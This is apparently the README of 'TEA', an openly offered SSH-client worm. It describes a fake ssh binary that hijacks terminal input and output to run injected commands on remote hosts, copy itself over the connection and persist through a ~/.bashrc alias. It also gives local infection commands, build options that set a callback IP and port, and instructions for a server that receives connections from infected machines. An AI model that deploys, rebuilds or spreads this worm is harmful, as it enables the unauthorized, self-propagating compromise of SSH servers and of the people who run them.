TEA
===

A ssh-client worm made with [tas framework](https://github.com/hc0d3r/tas).

How it works?
-------------

This is a fakessh-client that manipulates the tty input/output to execute arbitrary commands and upload itself through the ssh connection.

To work properly, the remote machine needs:

* display the "Last login" message when login.
* dd and stty
* target user using bash as default shell.
* capability to run the fakessh binary.
* writable ~/.bashrc

**Infect the local machine**:
```bash
mkdir ~/.sshworm
cp ssh ~/.sshworm
alias ssh='~/.sshworm/ssh'
```

The first time that you execute the fakessh, it will display nothing, the code in ```post-install.c``` will be executed and the string ```alias ssh="~/.sshworm/ssh"``` will be write to the ~/.bashrc:

```bash
$ ssh
$ ssh
usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]
           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]
           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]
           [-i identity_file] [-J [user@]host[:port]] [-L address]
           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]
           [-w local_tun[:remote_tun]] destination [command]
```

**Spread the world**

Now just connect to some ssh server, that meets the conditions stated for the program to work, and the machine will be infected, and the machines accessed through it too, and so on.

**tty manipulation**:

When the fakessh is executed, it will wait for the string "Last login" to start the I/O manipulation (output-hooks.c), when "Last login" is receveid it will send some arbitrary commands (inject-cmd.c) and will wait for the command result (output-hooks.c), if the file ~/.sshworm/ssh don't exists in the remote machine, then the worm will upload itself (upload.c).

See output-hooks.c for more details.

**Uninstall**:
```bash
$ rm -rf ~/.sshworm
$ perl -i -pe 's;alias ssh="~/.sshworm/ssh";;g' ~/.bashrc
$ unalias ssh
```

Compile
-------

I recommend the use of [musl-libc](https://www.musl-libc.org/how.html), or every else libc that isn't the glibc, the binary compiled using the glibc is 17 times bigger than the binary compiled using the musl-libc.

**Getting the source code**:
```bash
$ git clone --recurse-submodules https://github.com/hc0d3r/tea
```

**Build options**:

| Name    | Description            |
| ------- | ---------------------- |
| IP      | remote IPv4 to connect |
| PORT    | remote port to connect |

**Example**:
```bash
$ make CC=musl-gcc IP=my-ipv4 PORT=1234
```

Server
------
I made a simple server to handle the connections that will be receveid when the
code in post-install.c is executed.

The server mechanism is very simple, when a new connection is established, it execute a new command and pass the connection file descriptor through the command line, so the program executed will be able to handle the connection.

**Compile**
```bash
$ cd server
$ make
cc -Wall -Wextra -O3 -c net.c -o net.o
cc -Wall -Wextra -O3 -c replace.c -o replace.o
cc -Wall -Wextra -O3 -c term.c -o term.o
cc -Wall -Wextra -O3 -c main.c -o main.o
cc -Wall -Wextra -O3 -o server net.o replace.o term.o main.o
```

Demo
----
[![TEA - sshworm](http://img.youtube.com/vi/vbnD4LfJRow/0.jpg)](https://youtu.be/vbnD4LfJRow)

Contributing
------------
You can help with code, or donating money.
If you wanna help with code, use the kernel code style as a reference.

Paypal: [![](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=RAG26EKAYHQSY&currency_code=BRL&source=url)

BTC: 1PpbrY6j1HNPF7fS2LhG9SF2wtyK98GSwq
